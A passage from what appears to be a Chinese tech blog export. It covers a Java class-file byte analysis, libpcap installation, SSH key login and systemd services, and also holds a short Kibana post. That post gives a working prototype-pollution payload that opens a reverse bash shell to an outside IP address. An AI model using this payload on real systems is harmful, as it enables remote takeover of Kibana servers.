<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cafe babe 0000 0034 0023 0a00 0700 140a</span><br><span class="line">0006 0015 0900 1600 1709 0006 0018 0a00</span><br><span class="line">1900 1a07 001b 0700 1c01 0003 6162 6301</span><br><span class="line">0001 4901 0006 3c69 6e69 743e 0100 0328</span><br><span class="line">2956 0100 0443 6f64 6501 000f 4c69 6e65</span><br><span class="line">4e75 6d62 6572 5461 626c 6501 0004 6d61</span><br><span class="line">696e 0100 1628 5b4c 6a61 7661 2f6c 616e</span><br><span class="line">672f 5374 7269 6e67 3b29 5601 0008 7072</span><br><span class="line">696e 7441 4243 0100 083c 636c 696e 6974</span><br><span class="line">3e01 000a 536f 7572 6365 4669 6c65 0100</span><br><span class="line">0f48 656c 6c6f 576f 726c 642e 6a61 7661</span><br><span class="line">0c00 0a00 0b0c 0010 000b 0700 1d0c 001e</span><br><span class="line">001f 0c00 0800 0907 0020 0c00 2100 2201</span><br><span class="line">0017 636f 6d2f 7868 2f68 656c 6c6f 2f48</span><br><span class="line">656c 6c6f 576f 726c 6401 0010 6a61 7661</span><br><span class="line">2f6c 616e 672f 4f62 6a65 6374 0100 106a</span><br><span class="line">6176 612f 6c61 6e67 2f53 7973 7465 6d01</span><br><span class="line">0003 6f75 7401 0015 4c6a 6176 612f 696f</span><br><span class="line">2f50 7269 6e74 5374 7265 616d 3b01 0013</span><br><span class="line">6a61 7661 2f69 6f2f 5072 696e 7453 7472</span><br><span class="line">6561 6d01 0007 7072 696e 746c 6e01 0004</span><br><span class="line">2849 2956 0021 0006 0007 0000 0001 000a</span><br><span class="line">0008 0009 0000 0004 0001 000a 000b 0001</span><br><span class="line">000c 0000 001d 0001 0001 0000 0005 2ab7</span><br><span class="line">0001 b100 0000 0100 0d00 0000 0600 0100</span><br><span class="line">0000 0300 0900 0e00 0f00 0100 0c00 0000</span><br><span class="line">2000 0000 0100 0000 04b8 0002 b100 0000</span><br><span class="line">0100 0d00 0000 0a00 0200 0000 0700 0300</span><br><span class="line">0800 0a00 1000 0b00 0100 0c00 0000 2600</span><br><span class="line">0200 0000 0000 0ab2 0003 b200 04b6 0005</span><br><span class="line">b100 0000 0100 0d00 0000 0a00 0200 0000</span><br><span class="line">0b00 0900 0c00 0800 1100 0b00 0100 0c00</span><br><span class="line">0000 1e00 0100 0000 0000 0610 7bb3 0004</span><br><span class="line">b100 0000 0100 0d00 0000 0600 0100 0000</span><br><span class="line">0400 0100 1200 0000 0200 13</span><br></pre></td></tr></table></figure>

<p>使用 javap -verbose com.xh.hello.HelloWorld指令解析该类，获得以下内容，配合class文件一块儿分析。app</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Classfile /Users/maogong.han/java_tmp/com/xh/hello/HelloWorld.class</span><br><span class="line">  Last modified 2019-3-21; size 555 bytes</span><br><span class="line">  MD5 checksum 4b275a3e082827230300dcb233141209</span><br><span class="line">  Compiled from &quot;HelloWorld.java&quot;</span><br><span class="line">public class com.xh.hello.HelloWorld</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref #7.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Methodref #6.#21 // com/xh/hello/HelloWorld.printABC:()V</span><br><span class="line">   #3 = Fieldref #22.#23 // java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   #4 = Fieldref #6.#24 // com/xh/hello/HelloWorld.abc:I</span><br><span class="line">   #5 = Methodref #25.#26 // java/io/PrintStream.println:(I)V</span><br><span class="line">   #6 = Class #27 // com/xh/hello/HelloWorld</span><br><span class="line">   #7 = Class #28 // java/lang/Object</span><br><span class="line">   #8 = Utf8 abc</span><br><span class="line">   #9 = Utf8 I</span><br><span class="line">  #10 = Utf8 &lt;init&gt;</span><br><span class="line">  #11 = Utf8 ()V</span><br><span class="line">  #12 = Utf8 Code</span><br><span class="line">  #13 = Utf8 LineNumberTable</span><br><span class="line">  #14 = Utf8 main</span><br><span class="line">  #15 = Utf8 ([Ljava/lang/String;)V</span><br><span class="line">  #16 = Utf8 printABC</span><br><span class="line">  #17 = Utf8 &lt;clinit&gt;</span><br><span class="line">  #18 = Utf8 SourceFile</span><br><span class="line">  #19 = Utf8 HelloWorld.java</span><br><span class="line">  #20 = NameAndType #10:#11 // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #21 = NameAndType #16:#11 // printABC:()V</span><br><span class="line">  #22 = Class #29 // java/lang/System</span><br><span class="line">  #23 = NameAndType #30:#31 // out:Ljava/io/PrintStream;</span><br><span class="line">  #24 = NameAndType #8:#9 // abc:I</span><br><span class="line">  #25 = Class #32 // java/io/PrintStream</span><br><span class="line">  #26 = NameAndType #33:#34 // println:(I)V</span><br><span class="line">  #27 = Utf8 com/xh/hello/HelloWorld</span><br><span class="line">  #28 = Utf8 java/lang/Object</span><br><span class="line">  #29 = Utf8 java/lang/System</span><br><span class="line">  #30 = Utf8 out</span><br><span class="line">  #31 = Utf8 Ljava/io/PrintStream;</span><br><span class="line">  #32 = Utf8 java/io/PrintStream</span><br><span class="line">  #33 = Utf8 println</span><br><span class="line">  #34 = Utf8 (I)V</span><br><span class="line">&#123;</span><br><span class="line">  public com.xh.hello.HelloWorld();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 3: 0</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    descriptor: ([Ljava/lang/String;)V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=0, locals=1, args_size=1</span><br><span class="line">         0: invokestatic  #2 // Method printABC:()V</span><br><span class="line">         3: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 7: 0</span><br><span class="line">        line 8: 3</span><br><span class="line"></span><br><span class="line">  static &#123;&#125;;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=0, args_size=0</span><br><span class="line">         0: bipush        123</span><br><span class="line">         2: putstatic     #4 // Field abc:I</span><br><span class="line">         5: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;HelloWorld.java&quot;</span><br></pre></td></tr></table></figure>

<h3 id="魔数与class文件版本号"><a href="#魔数与class文件版本号" class="headerlink" title="魔数与class文件版本号"></a>魔数与class文件版本号</h3><p>魔数是class文件的前4个字节，是一个固定值:0xcafebabe。该值惟一的做用就是表示文件是否能够被JVM接受，不严格的说就是表示该文件是不是class文件。<br>版本号<br><img src="https://ewr1.vultrobjects.com/imgur1/000/001/680/238_738_c46.jpg" alt="Description"></p>
<h3 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h3><ul>
<li>常量池计数器</li>
</ul>
<p>常量池计数器表示常量池中的项的个数，在class文件中的位置是主版本号以后的2个字节，也就是第9和第10个字节。常量池计数器是从1开始的，在constant_pool表中，只有索引大于0且小于constant_pool_count的项才是有效的。<br>本例中constant_pool_count的值是0x0023，换算成十进制是35，表示constant_pool中有34项，有效索引是1到34，恰好是用javap解析出来的34个常量。</p>
<ul>
<li>常量池</li>
</ul>
<p>class文件中，constant_pool_count以后紧接着就是常量池的内容。每一个常量池项(cp_info)都是由一个u1类型的tag和一个具体类型的表构成，具体类型由tag的值决定。以下表：</p>
<table>
<thead>
<tr>
<th>tag值</th>
<th>对应的类型</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
</tr>
</tbody></table>
<p>7	CONSTANT_Class_info<br>9	CONSTANT_Fieldref_info<br>10	CONSTANT_Methodref_info<br>11	CONSTANT_InterfaceMethodref_info<br>8	CONSTANT_String_info<br>3	CONSTANT_Integer_info<br>4	CONSTANT_Float_info<br>5	CONSTANT_Long_info<br>6	CONSTANT_Double_info<br>12	CONSTANT_NameAndType_info<br>1	CONSTANT_Utf8_info<br>15	CONSTANT_MethodHandle_info<br>16	CONSTANT_MethodType_info<br>18	CONSTANT_InvokeDynamic_info<br>截取上文反编译出来的常量池部分信息，来分析常量池中的第一个常量。jvm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1 = Methodref #7.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">#7 = Class #28 // java/lang/Object</span><br><span class="line">#10 = Utf8 &lt;init&gt;</span><br><span class="line">#11 = Utf8 ()V</span><br><span class="line">#20 = NameAndType #10:#11 // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">#28 = Utf8 java/lang/Object</span><br></pre></td></tr></table></figure>
<p><img src="https://ewr1.vultrobjects.com/imgur1/000/001/680/240_32d_d6a.jpg" alt="Description"><br>“#1”表示常量池中索引是1。class文件中的0x0a位置开始。类型是Methodref。Methodref类型的结构以下：ui</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTANT_Methodref_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 class_index;</span><br><span class="line">    u2 name_and_type_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Methodref中tag的值为0x0a，十进制为10，正好表示CONSTANT_Methodref_info类型。<br>class_index的值为0x0007，十进制为7，指向索引为7的常量池的项。#7是CONSTANT_Class_info类型，指向CONSTANT_Utf8_info类型的#28，表示此常量属于java&#x2F;lang&#x2F;Object的。<br>name_and_type_index的值为0x0014，十进制为20，指向索引为20的常量池的项，此项是NameAndType（字段或方法）类型，方法名索引（name_index）指向常量池的#10，为一个CONSTANT_Utf8_info类型，表示方法名为”<init>“；NameAndType的方法描述索引（descriptor_index）指向常量池的#11，表示无参类型。this</p>
<p>CONSTANT_Class_info类型结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTANT_Class_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 name_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tag值为7，表示是CONSTANT_Class_info类型。 name_index是指向常量池中一个类型为CONSTANT_Utf8_info的常量索引，表示类或者接口的名字。</p>
<p>CONSTANT_Utf8_info类型结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTANT_Utf8_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 length;</span><br><span class="line">    u1 bytes[length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tag值为1，表示CONSTANT_Utf8_info类型。bytes指的是字符串值的bytes数组。 bytes表示的字符串和十六进制转换可由下程序完成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static String printHexString(byte[] b) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        for (int i = 0; i &lt; b.length; i++) &#123;</span><br><span class="line">            String hex = Integer.toHexString(b[i] &amp; 0xFF);</span><br><span class="line">            if (hex.length() == 1) &#123;</span><br><span class="line">                hex = &#x27;0&#x27; + hex;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上文提到的各项类型结构和说明可参考《Java虚拟机规范》。</p>
<h3 id="访问标志符"><a href="#访问标志符" class="headerlink" title="访问标志符"></a>访问标志符</h3><p>在常量池以后，紧挨着是占2个字节的访问标志符：0x0021。<br>ACC_PUBLIC(0x0001)+ACC_SUPER (0x0020)。<br>access_flags表示类或接口的访问权限。其取值和含义见下表：</p>
<table>
<thead>
<tr>
<th>标记名</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
<td>content3</td>
</tr>
</tbody></table>
<p>ACC_PUBLIC	0x0001	为public类型<br>ACC_FINAL	0x0010	是否为final类型，只有类可设置<br>ACC_SUPER	0x0020	当用到invokespecial指令时，是否须要特殊处理的父类方法<br>ACC_INTERFACE	0x0200	标识接口，不是类<br>ACC_ABSTRACT	0x0400	标识是否为abstract，是否能够实例化<br>ACC_SYNTHETIC	0x1000	标识并不是由Java源码生成的代码，而是由编译器生成的<br>ACC_ANNOTATION	0x2000	注解类型<br>ACC_ENUM	0x4000	枚举类型</p>
<h3 id="类索引、父类索引和接口索引"><a href="#类索引、父类索引和接口索引" class="headerlink" title="类索引、父类索引和接口索引"></a>类索引、父类索引和接口索引</h3><p>访问标记符以后，紧接着是类索引、父类索引和接口索引。<br>类索引和父类索引都是一个u2类型的数据，接口索引是一组u2类型数据的集合。他们的值都表示在常量池中的索引。另外这三项数据肯定了类的关系：单继承、多实现。</p>
<p>类索引（this_class）<br>类索引在常量池中的索引值为0x0006，十进制为6，指向一个CONSTANT_Class_info类型的常量，其tag值为7，name_index指向27的索引。<br>#6 &#x3D; Class #27 &#x2F;&#x2F; com&#x2F;xh&#x2F;hello&#x2F;HelloWorld<br>#27 &#x3D; Utf8 com&#x2F;xh&#x2F;hello&#x2F;HelloWorld<br>复制代码</p>
<p>父类索引（super_class）<br>类索引以后，是父类索引。在常量池中的索引值为0x0007，十进制为7，指向一个CONSTANT_Class_info类型的常量，其tag值为7，name_index指向28的索引。<br>#7 &#x3D; Class #28 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object<br>#28 &#x3D; Utf8 java&#x2F;lang&#x2F;Object<br>复制代码</p>
<p>接口索引(interfaces) 在父类索引以后的内容是接口索引计数器(interfaces_count)和接口索引表(interfaces)，class文件中interfaces_count的值为0x0000，表示未实现任何接口，这里不在讨论。</p>
<h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>在接口索引表以后是字段索引计数器和字段索引表。字段索引计数器是一个u2类型的数值，class文件中的值为0x0001，表示有一个字段。<br>字段表中的每项都表示指向常量池中的一个索引，该索引指向一个field_info结构的数据。字段表描述当前类或接口声明的全部字段，但不包括从父类或接口中继承过来的。</p>
<p>field_info {<br>  u2 access_flags;<br>  u2 name_index;<br>  u2 descriptor_index;<br>  u2 attributes_count;<br>  attribute_info attrubutes[attributes_count];<br>}<br>复制代码<br>access_flags项定义字段的访问权限和基础属性，以下表：<br>字段access_flags表：</p>
<p>标记名	值	说明<br>ACC_PUBLIC	0x0001	public，字段能够被从任何package访问<br>ACC_PRIVATE	0x0002	private，字段只能够被该类自身访问<br>ACC_PROTECTED	0x0004	protected，字段能够被子类访问<br>ACC_STATIC	0x0008	static，静态字段<br>ACC_FINAL	0x0010	final，字段定义后没法修改<br>ACC_VOLATILE	0x0040	volatile字段<br>ACC_TRANSIENT	0x0080	transient，是否被序列化<br>ACC_SYNTHETIC	0x1000	是否编译器自动生成<br>ACC_ENUM	0x4000	是否为枚举<br>name_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示字段的非全限定名。<br>descriptor_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示字段的描述符。<br>字段描述符以下表：<br>字符	类型	说明<br>B	byte	<br>C	char	<br>D	double	<br>F	float	<br>I	int	<br>J	long	<br>S	short	<br>Z	boolean	<br>LClassname	reference	一个Classname的实例<br>[	reference	一个一维数组<br>attribute_info表示的是字段的附加属性。<br>本例class文件中access_flags的值为0x000a：ACC_PRIVATE(0x0002) + ACC_STATIC(0x0008)。name_index的值为0x0008，指向常量池的索引为8。descriptor_index的值为0x0009，指向常量池的索引为9。附加属性的值为0x0000，表示没有属性。综上该字段是一个被private和static修饰的int类型的字段，名称是”abc”。</p>
<p>#8 &#x3D; Utf8 abc<br>#9 &#x3D; Utf8 I<br>复制代码</p>
<h3 id="方法区域"><a href="#方法区域" class="headerlink" title="方法区域"></a>方法区域</h3><p>字段以后，紧接着是方法区域。有方法计数器(methods_count)和方法表(methods)。方法计数器是一个u2类型的数值，本例class中值为0x0004，表示有4个方法。方法表中每一项都是method_info结构。</p>
<p>method_info {<br>  u2 access_flags;<br>  u2 name_index;<br>  u2 descriptor_index;<br>  u2 attributes_count;<br>  attribute_info attributes[attributes_count];<br>}<br>复制代码<br>access_flags表示方法的访问权限和基本属性。以下表：<br>方法access_flags表：<br>标记名	值	说明<br>ACC_PUBLIC	0x0001	public，方法能够被从任何package访问<br>ACC_PRIVATE	0x0002	private，方法只能够被该类自身访问<br>ACC_PROTECTED	0x0004	protected，方法能够被子类访问<br>ACC_STATIC	0x0008	static，静态方法<br>ACC_FINAL	0x0010	final，方法不能被重写<br>ACC_SYNCHRONIZED	0x0020	synchronized，方法加同步<br>ACC_BRIDGE	0x0040	bridge，方法由编译器生成<br>ACC_VARARGS	0x0080	方法有可变参数<br>ACC_NATIVE	0x0100	native，方法引用非Java语言的本地方法<br>ACC_ABSTRACT	0x0400	abstract，抽象方法<br>ACC_STRICT	0x0800	strictfp，方法使用FP-strict浮点格式<br>ACC_SYNTHETIC	0x1000	方法在源文件中不出现，由编译器产生<br>name_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示方法的非全限定名或者初始化方法的名字(<init>或<clinit>方法)。<br>descriptor_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示方法的描述符。<br>attributes_count和attributes分别表示方法附加属性的计数器和附加属性表。<br>这里分析第一个方法。方法计数器0x0004以后，是第一个方法的access_flags，值为0x0001，表示public类型。接下来是name_index，值为0x0001，指向常量池索引为1的项，该项表示的是java&#x2F;lang&#x2F;Object.”<init>“:()V方法。接下来是descriptor_index，值为0x000a，指向常量池索引为10的项，表示方法的非全限定名。接下来是attributes_count，值为0x000b，表示有11个附加属性，以后是这11个附加属性的数据，包含code和操做符，这里不在展开，以后会专门写解析的内容。</p>
<p>#1 &#x3D; Methodref #7.#20 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.”<init>“:()V<br>#7 &#x3D; Class #28 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object<br>#10 &#x3D; Utf8 <init><br>#11 &#x3D; Utf8 ()V<br>#20 &#x3D; NameAndType #10:#11 &#x2F;&#x2F; “<init>“:()V<br>#28 &#x3D; Utf8 java&#x2F;lang&#x2F;Object<br>复制代码</p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>这里主要记录文件的属性。有属性计数器attributes_count和属性表attributes。<br>本例class文件中，attributes_count值为0x0001，表示有一个属性。属性表中的每一项都常量池中的一个索引，该索引处的格式为：</p>
<p>attribute_info {<br>  u2 attribute_name_index;<br>  u4 attribute_length;<br>  u2 source_file_index;<br>}<br>复制代码<br>attribute_name_index的值为0x0012，指向索引为18的常量池的项，该项是一个CONSTANT_Utf8_info结构，表示“SourceFile”。而后是attribute_length的值为0x00000002，表示紧跟其后的有2个字节，source_file_index值为0x0013，指向索引为19的常量池项，该项是一个CONSTANT_Utf8_info结构，表示“HelloWorld.java”。至此class文件简单分析完毕。</p>
<p>#18 &#x3D; Utf8 SourceFile<br>#19 &#x3D; Utf8 HelloWorld.java<br>复制代码</p>
<h2 id="附class文件结构备注"><a href="#附class文件结构备注" class="headerlink" title="附class文件结构备注"></a>附class文件结构备注</h2><p>魔数:<br>cafe babe </p>
<p>副版本号和主版本号:<br>0000 0034 </p>
<p>常量池：<br>0023 0a00 0700 140a<br>0006 0015 0900 1600 1709 0006 0018 0a00<br>1900 1a07 001b 0700 1c01 0003 6162 6301<br>0001 4901 0006 3c69 6e69 743e 0100 0328<br>2956 0100 0443 6f64 6501 000f 4c69 6e65<br>4e75 6d62 6572 5461 626c 6501 0004 6d61<br>696e 0100 1628 5b4c 6a61 7661 2f6c 616e<br>672f 5374 7269 6e67 3b29 5601 0008 7072<br>696e 7441 4243 0100 083c 636c 696e 6974<br>3e01 000a 536f 7572 6365 4669 6c65 0100<br>0f48 656c 6c6f 576f 726c 642e 6a61 7661<br>0c00 0a00 0b0c 0010 000b 0700 1d0c 001e<br>001f 0c00 0800 0907 0020 0c00 2100 2201<br>0017 636f 6d2f 7868 2f68 656c 6c6f 2f48<br>656c 6c6f 576f 726c 6401 0010 6a61 7661<br>2f6c 616e 672f 4f62 6a65 6374 0100 106a<br>6176 612f 6c61 6e67 2f53 7973 7465 6d01<br>0003 6f75 7401 0015 4c6a 6176 612f 696f<br>2f50 7269 6e74 5374 7265 616d 3b01 0013<br>6a61 7661 2f69 6f2f 5072 696e 7453 7472<br>6561 6d01 0007 7072 696e 746c 6e01 0004<br>2849 2956 </p>
<p>访问标记符:<br>0021 </p>
<p>类在常量池中的索引:<br>0006<br>父类在常量池中的索引:<br>0007<br>接口索引计数器:<br>0000 </p>
<p>字段索引计数器:<br>0001<br>第一个字段field_info:<br>000a access_flags<br>0008 name_index<br>0009 descriptor_index<br>0000 附加属性</p>
<p>方法计数器:<br>0004<br>方法表:<br>0001 000a 000b 0001<br>000c 0000 001d 0001 0001 0000 0005 2ab7<br>0001 b100 0000 0100 0d00 0000 0600 0100<br>0000 0300 0900 0e00 0f00 0100 0c00 0000<br>2000 0000 0100 0000 04b8 0002 b100 0000<br>0100 0d00 0000 0a00 0200 0000 0700 0300<br>0800 0a00 1000 0b00 0100 0c00 0000 2600<br>0200 0000 0000 0ab2 0003 b200 04b6 0005<br>b100 0000 0100 0d00 0000 0a00 0200 0000<br>0b00 0900 0c00 0800 1100 0b00 0100 0c00<br>0000 1e00 0100 0000 0000 0610 7bb3 0004<br>b100 0000 0100 0d00 0000 0600 0100 0000<br>04</p>
<p>属性计数器:<br>00 01<br>第一个属性:<br>00 12 attribute_name_index<br>00 0000 02 attribute_length<br>00 13 source_file_index<br>复制代码</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>The Java Virtual Machine Instruction Set<br>《Java虚拟机规范》</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>kibana远程代码执行漏洞</title>
    <url>/2024/09/10/kibana%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;rm -f tmp/.a;mknod /tmp/.a p &amp;&amp; telnet 42.193.253.66 7122 0&lt;/tmp/.a|&amp; /bin/bash &gt;&amp; /tmp/.a;rm -f /tmp/.a&quot;);process.exit()//&#x27;).props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/blog/94b32099dabeb9da68f183f89c31b945.png"></p>
<p>然后点击Canvas即可实现反弹<br><img src="/images/blog/6403360132a89d61dcfe13bf63a42b36.png"></p>
]]></content>
  </entry>
  <entry>
    <title>libpacp安装</title>
    <url>/2024/09/10/libpacp%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h3 id="0x1-最简单的方法"><a href="#0x1-最简单的方法" class="headerlink" title="0x1 最简单的方法"></a>0x1 最简单的方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install -y libpcap-dev</span><br><span class="line">yum install -y libpcap-dev</span><br></pre></td></tr></table></figure>

<h3 id="0x2-手动安装"><a href="#0x2-手动安装" class="headerlink" title="0x2 手动安装"></a>0x2 手动安装</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.tcpdump.org/</span><br></pre></td></tr></table></figure>
<p><img src="/images/blog/c700a4f8c0b119e0cee3a2b6f380f01f.png"></p>
<h4 id="解压-安装支持工具："><a href="#解压-安装支持工具：" class="headerlink" title="解压&amp;安装支持工具："></a>解压&amp;安装支持工具：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y gcc</span><br><span class="line">yum install -y flex</span><br><span class="line">yum install -y byacc</span><br></pre></td></tr></table></figure>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>如果运行程序时仍提示找不到libpcap库，此时执行一下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name libpcap.so  </span><br><span class="line">find / -name libpcap.so.1</span><br></pre></td></tr></table></figure>

<p>把找到的文件拷贝到&#x2F;usr&#x2F;lib下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/local/lib/libpcap.so /usr/lib/</span><br><span class="line">cp /usr/local/lib/libpcap.so.1 /usr/lib/</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>linux ssh 免密登录配置</title>
    <url>/2024/09/10/linux-ssh-%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>配置SSH无密码登录需要3步：</p>
<h3 id="生成公钥和私钥"><a href="#生成公钥和私钥" class="headerlink" title="生成公钥和私钥"></a>生成公钥和私钥</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>全部回车确认就行<br><img src="/images/blog/430b0e8dee2975cc706a3b9d875312d3.png"></p>
<h3 id="导入公钥到认证文件-更改权限"><a href="#导入公钥到认证文件-更改权限" class="headerlink" title="导入公钥到认证文件,更改权限"></a>导入公钥到认证文件,更改权限</h3><p>默认在 ~&#x2F;.ssh目录生成两个文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id_rsa ：私钥</span><br><span class="line">id_rsa.pub ：公钥</span><br></pre></td></tr></table></figure>
<p>把公钥导入你要登录的服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>更改权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 700 ~/.ssh  </span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>3.测试登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@22.44.11.11</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>linux 自定义service服务</title>
    <url>/2024/09/10/linux-%E8%87%AA%E5%AE%9A%E4%B9%89service%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<h3 id="0x0-新建服务文件"><a href="#0x0-新建服务文件" class="headerlink" title="0x0 新建服务文件"></a>0x0 新建服务文件</h3><p>系统服务一般位于【&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system】【&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;】目录下。<br>模板service文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=服务描述</span><br><span class="line">After=服务依赖（再这些服务后启动本服务）</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type=服务类型</span><br><span class="line">ExecStart=启动命令</span><br><span class="line">ExecStop=终止命令</span><br><span class="line">ExecReload=重启命令</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=服务安装设置</span><br></pre></td></tr></table></figure>

<p>【Type】的值有以下几个：</p>
<blockquote>
<ul>
<li>simple：这是默认的值，指定了ExecStart设置后，simple就是默认的Type设置除非指定Type。simple使用ExecStart创建的进程作为服务的主进程，在此设置下systemd会立即启动服务。</li>
<li>forking：如果使用了这个值，则ExecStart的脚本启动后会调用fork()函数创建一个进程作为其启动的一部分。当初始化完成，父进程会退出。子进程会继续作为主进程执行。</li>
<li>oneshot：类似simple，但是在systemd启动之前，进程就会退出。这是一次性的行为。可能还需要设置RemainAfterExit&#x3D;yes，以便systemd认为j进程退出后仍然处于激活状态。</li>
<li>dbus：也和simple很相似，该配置期待或设置一个name值，通过设置* BusName&#x3D;设置name即可。</li>
<li>notify：同样地，与simple相似的配置。顾名思义，该设置会在守护进程启动的时候发送推送消息。</li>
</ul>
</blockquote>
<p>简单的配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Redis-Server</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line"> </span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/opt/Redis-6.2.1/redis-server /root/RedisData/redis-conf.conf</span><br><span class="line">ExecStop=kill -9 $(pidof redis-server)</span><br><span class="line">ExecReload=kill -9 $(pidof redis-server) &amp;&amp; /opt/Redis-6.2.1/redis-server /root/RedisData/redis-conf.conf</span><br><span class="line"> </span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>

